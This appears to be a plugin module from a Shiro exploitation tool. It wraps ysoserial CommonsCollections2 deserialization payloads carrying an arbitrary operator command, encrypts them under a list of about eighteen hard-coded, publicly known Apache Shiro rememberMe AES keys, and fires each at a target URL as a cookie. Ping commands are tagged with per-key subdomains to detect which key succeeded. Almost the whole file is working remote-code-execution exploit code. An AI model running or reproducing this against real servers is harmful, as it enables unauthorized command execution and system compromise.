# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import base64
import uuid
import subprocess
import requests
import sys
from Crypto.Cipher import AES
from ..main import Idea

JAR_FILE = 'module/ysoserial.jar'

@Idea.plugin_register('Class3:CommonsCollections2')
class CommonsCollections2(object):
    def process(self,url,command):
        self.poc(url,command)
        
    
    def poc(self,url, command):
        target = url
        try:
            # 目标机执行的代码
            command1=command.replace('ping ','ping kPH.bIxk5D2deZiIxcaaaA.')
            payload = self.generator(command1, JAR_FILE)  # 生成payload
            
            r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=20)  # 发送验证请求1
            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
            if(r.status_code==200):              
                print("[+]   CommonsCollections2模块   key1:kPH+bIxk5D2deZiIxcaaaA== 已成功发送！")
                print("[+]   状态码:"+str(r.status_code))
            else:
                print("[-]   CommonsCollections2模块   key1:kPH+bIxk5D2deZiIxcaaaA== 发送异常！")
                print("[-]   状态码:"+str(r.status_code))

            command2=command.replace('ping ','ping wGiHplamyXlVB11UXWol8g.')
            payload2 = self.generator2(command2, JAR_FILE)   # 生成payload2
            r2 = requests.get(target, cookies={'rememberMe': payload2.decode()}, timeout=20)  # 发送验证请求2
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key2:wGiHplamyXlVB11UXWol8g== 已成功发送！")
                print("[+]   状态码:"+str(r2.status_code))
            else:
                print("[-]   CommonsCollections2模块   key2:wGiHplamyXlVB11UXWol8g== 发送异常！")
                print("[-]   状态码:"+str(r2.status_code))


            command3=command.replace('ping ','ping 2AvVhdsgUs0FSA3SDFAdag.')
            payload3 = self.generator3(command3, JAR_FILE) # 生成payload3
            r3 = requests.get(target, cookies={'rememberMe': payload3.decode()}, timeout=20)  # 发送验证请求3
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key3:2AvVhdsgUs0FSA3SDFAdag== 已成功发送！")
                print("[+]   状态码:"+str(r3.status_code))
            else:
                print("[-]   CommonsCollections2模块   key3:2AvVhdsgUs0FSA3SDFAdag== 发送异常！")
                print("[-]   状态码:"+str(r3.status_code))

            command4=command.replace('ping ','ping 4AvVhmFLUs0KTA3Kprsdag.')
            payload4 = self.generator4(command4, JAR_FILE)  # 生成payload4
            r4 = requests.get(target, cookies={'rememberMe': payload4.decode()}, timeout=20)  # 发送验证请求4
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key4:4AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                print("[+]   状态码:"+str(r4.status_code))
            else:
                print("[-]   CommonsCollections2模块   key4:4AvVhmFLUs0KTA3Kprsdag== 发送异常！")
                print("[-]   状态码:"+str(r4.status_code))

            command5=command.replace('ping ','ping 3AvVhmFLUs0KTA3Kprsdag.')
            payload5 = self.generator5(command5, JAR_FILE)  # 生成payload5
            r5 = requests.get(target, cookies={'rememberMe': payload5.decode()}, timeout=20)  # 发送验证请求5
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key5:3AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                print("[+]   状态码:"+str(r5.status_code))
            else:
                print("[-]   CommonsCollections2模块   key5:3AvVhmFLUs0KTA3Kprsdag== 发送异常！")
                print("[-]   状态码:"+str(r5.status_code))

            command6=command.replace('ping ','ping Z3VucwAAAAAAAAAAAAAAAA.')
            payload6 = self.generator6(command6, JAR_FILE)  # 生成payload6
            r6 = requests.get(target, cookies={'rememberMe': payload6.decode()}, timeout=20)  # 发送验证请求6
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key6:Z3VucwAAAAAAAAAAAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r6.status_code))
            else:
                print("[-]   CommonsCollections2模块   key6:Z3VucwAAAAAAAAAAAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r6.status_code))

            command7=command.replace('ping ','ping U3ByaW5nQmxhZGUAAAAAAA.')
            payload7 = self.generator7(command7, JAR_FILE)  # 生成payload7
            r7 = requests.get(target, cookies={'rememberMe': payload7.decode()}, timeout=20)  # 发送验证请求2
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key7:U3ByaW5nQmxhZGUAAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r7.status_code))
            else:
                print("[-]   CommonsCollections2模块   key7:U3ByaW5nQmxhZGUAAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r7.status_code))

            command8=command.replace('ping ','ping wGiHplamyXlVB11UXWol8g.')
            payload8 = self.generator8(command8, JAR_FILE)  # 生成payload8
            r8 = requests.get(target, cookies={'rememberMe': payload8.decode()}, timeout=20)  # 发送验证请求8
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key8:wGiHplamyXlVB11UXWol8g== 已成功发送！")
                print("[+]   状态码:"+str(r8.status_code))
            else:
                print("[-]   CommonsCollections2模块   key8:wGiHplamyXlVB11UXWol8g== 发送异常！")
                print("[-]   状态码:"+str(r8.status_code))

            command9=command.replace('ping ','ping 6ZmI6I2j5Y.R5aSn5ZOlAA.')
            payload9 = self.generator9(command9, JAR_FILE)   # 生成payload9
            r9 = requests.get(target, cookies={'rememberMe': payload9.decode()}, timeout=20)  # 发送验证请求9
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key9:6ZmI6I2j5Y+R5aSn5ZOlAA== 已成功发送！")
                print("[+]   状态码:"+str(r9.status_code))
            else:
                print("[-]   CommonsCollections2模块   key9:6ZmI6I2j5Y+R5aSn5ZOlAA== 发送异常！")
                print("[-]   状态码:"+str(r9.status_code))

           
        #分界线
            
            
            
            
            

            
            
            #后补编码
            command100=command.replace('ping ','ping fCq.xW488hMTCD.cmJ3aQ.')
            payload100 = self.generator100(command100, JAR_FILE)   # 生成payload100
            r100 = requests.get(target, cookies={'rememberMe': payload100.decode()}, timeout=20)  # 发送验证请求100
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key10:fCq+/xW488hMTCD+cmJ3aQ== 已成功发送！")
                print("[+]   状态码:"+str(r100.status_code))
            else:
                print("[-]   CommonsCollections2模块   key10:fCq+/xW488hMTCD+cmJ3aQ== 发送异常！")
                print("[-]   状态码:"+str(r100.status_code))
            
            command111=command.replace('ping ','ping 1QWLxg.NYmxraMoxAXu.Iw.')
            payload111 = self.generator111(command111, JAR_FILE)   # 生成payload111
            r111 = requests.get(target, cookies={'rememberMe': payload111.decode()}, timeout=20)  # 发送验证请求111
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key11:1QWLxg+NYmxraMoxAXu/Iw== 已成功发送！")
                print("[+]   状态码:"+str(r111.status_code))
            else:
                print("[-]   CommonsCollections2模块   key11:1QWLxg+NYmxraMoxAXu/Iw== 发送异常！")
                print("[-]   状态码:"+str(r111.status_code))
            
            command222=command.replace('ping ','ping ZUdsaGJuSmxibVI2ZHc9PQ.')
            payload222 = self.generator222(command222, JAR_FILE)   # 生成payload222
            r222 = requests.get(target, cookies={'rememberMe': payload222.decode()}, timeout=20)  # 发送验证请求222
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key12:ZUdsaGJuSmxibVI2ZHc9PQ== 已成功发送！")
                print("[+]   状态码:"+str(r222.status_code))
            else:
                print("[-]   CommonsCollections2模块   key12:ZUdsaGJuSmxibVI2ZHc9PQ== 发送异常！")
                print("[-]   状态码:"+str(r222.status_code))
            
            command333=command.replace('ping ','ping L7RioUULEFhRyxM7a2R.Yg.')
            payload333 = self.generator333(command333, JAR_FILE)   # 生成payload333
            r333 = requests.get(target, cookies={'rememberMe': payload333.decode()}, timeout=20)  # 发送验证请求333
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key13:L7RioUULEFhRyxM7a2R/Yg== 已成功发送！")
                print("[+]   状态码:"+str(r333.status_code))
            else:
                print("[-]   CommonsCollections2模块   key13:L7RioUULEFhRyxM7a2R/Yg== 发送异常！")
                print("[-]   状态码:"+str(r333.status_code))
            
            command444=command.replace('ping ','ping r0e3c16IdVkouZgk1TKVMg')
            payload444 = self.generator444(command444, JAR_FILE)   # 生成payload444
            r444 = requests.get(target, cookies={'rememberMe': payload444.decode()}, timeout=20)  # 发送验证请求444
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key14:r0e3c16IdVkouZgk1TKVMg== 已成功发送！")
                print("[+]   状态码:"+str(r444.status_code))
            else:
                print("[-]   CommonsCollections2模块   key14:r0e3c16IdVkouZgk1TKVMg== 发送异常！")
                print("[-]   状态码:"+str(r444.status_code))
            

            
            command666=command.replace('ping ','ping 5aaC5qKm5oqA5pyvAAAAAA')
            payload666 = self.generator666(command666, JAR_FILE)   # 生成payload666
            r666 = requests.get(target, cookies={'rememberMe': payload666.decode()}, timeout=20)  # 发送验证请求666
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key15:5aaC5qKm5oqA5pyvAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r666.status_code))
            else:
                print("[-]   CommonsCollections2模块   key15:5aaC5qKm5oqA5pyvAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r666.status_code))
            
            command777=command.replace('ping ','ping bWluZS1hc3NldC1rZXk6QQ')
            payload777 = self.generator777(command777, JAR_FILE)   # 生成payload777
            r777 = requests.get(target, cookies={'rememberMe': payload777.decode()}, timeout=20)  # 发送验证请求777
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key16:bWluZS1hc3NldC1rZXk6QQ== 已成功发送！")
                print("[+]   状态码:"+str(r777.status_code))
            else:
                print("[-]   CommonsCollections2模块   key16:bWluZS1hc3NldC1rZXk6QQ== 发送异常！")
                print("[-]   状态码:"+str(r777.status_code))
            
            command888=command.replace('ping ','ping a2VlcE9uR29pbmdBbmRGaQ')
            payload888 = self.generator888(command888, JAR_FILE) 
  # 生成payload888
            r888 = requests.get(target, cookies={'rememberMe': payload888.decode()}, timeout=20)  # 发送验证请求888
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key17:a2VlcE9uR29pbmdBbmRGaQ== 已成功发送！")
                print("[+]   状态码:"+str(r888.status_code))
            else:
                print("[-]   CommonsCollections2模块   key17:a2VlcE9uR29pbmdBbmRGaQ== 发送异常！")
                print("[-]   状态码:"+str(r888.status_code))
            
            command999=command.replace('ping ','ping WcfHGU25gNnTxTlmJMeSpw')
            payload999 = self.generator999(command999, JAR_FILE)  # 生成payload999
            r999 = requests.get(target, cookies={'rememberMe': payload999.decode()}, timeout=20)  # 发送验证请求999
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key18:WcfHGU25gNnTxTlmJMeSpw== 已成功发送！")
                print("[+]   状态码:"+str(r999.status_code))
            else:
                print("[-]   CommonsCollections2模块   key18:WcfHGU25gNnTxTlmJMeSpw== 发送异常！")
                print("[-]   状态码:"+str(r999.status_code))
            '''
            payload555 = self.generator555(command, JAR_FILE)  # 生成payload555
            
            r555 = requests.get(target, cookies={'rememberMe': payload555.decode()}, timeout=20)  # 发送验证请求555
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key19:ZWvohmPdUsAWT3=KpPqda 已成功发送！")
                print("[+]   状态码:"+str(r555.status_code))
            
            payload1111 = self.generator1111(command, JAR_FILE)  # 生成payload1111
            
            r1111 = requests.get(target, cookies={'rememberMe': payload555.decode()}, timeout=20)  # 发送验证请求1111
            if(r.status_code==200):
                print("[+]   CommonsCollections2模块   key20:LEGEND-CAMPUS-CIPHERKEY== 已成功发送！")
                print("[+]   状态码:"+str(r1111.status_code))
            '''  

           #后补编码
            
        except Exception as e:
            print(e)    
        return False


    def generator(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "kPH+bIxk5D2deZiIxcaaaA=="    #key
        
        
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        
        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
        
        file_body = pad(popen.stdout.read())         #受popen影响的file_body


        
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator2(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "wGiHplamyXlVB11UXWol8g=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator3(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen 
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "2AvVhdsgUs0FSA3SDFAdag=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator4(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "4AvVhmFLUs0KTA3Kprsdag=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator5(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "3AvVhmFLUs0KTA3Kprsdag=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator6(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "Z3VucwAAAAAAAAAAAAAAAA=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator7(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "U3ByaW5nQmxhZGUAAAAAAA=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator8(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "wGiHplamyXlVB11UXWol8g=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator9(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "6ZmI6I2j5Y+R5aSn5ZOlAA=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext
        
        
        
    #分界线



        
        #后补编码
        
    def generator100(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "fCq+/xW488hMTCD+cmJ3aQ=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator111(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "1QWLxg+NYmxraMoxAXu/Iw=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator222(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "ZUdsaGJuSmxibVI2ZHc9PQ=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator333(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "L7RioUULEFhRyxM7a2R/Yg=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator444(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "r0e3c16IdVkouZgk1TKVMg=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator555(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "ZWvohmPdUsAWT3=KpPqda"    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator666(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "5aaC5qKm5oqA5pyvAAAAAA=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator777(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "bWluZS1hc3NldC1rZXk6QQ=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator888(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "a2VlcE9uR29pbmdBbmRGaQ=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


    def generator999(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "WcfHGU25gNnTxTlmJMeSpw=="    #key
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())         
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext

    def generator1111(self,command, fp):
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],       #popen
                                 stdout=subprocess.PIPE)

        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        
        key = "LEGEND-CAMPUS-CIPHERKEY=="    #key
        
        
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        
        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
        
        file_body = pad(popen.stdout.read())         #受popen影响的file_body


        
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))


        return base64_ciphertext


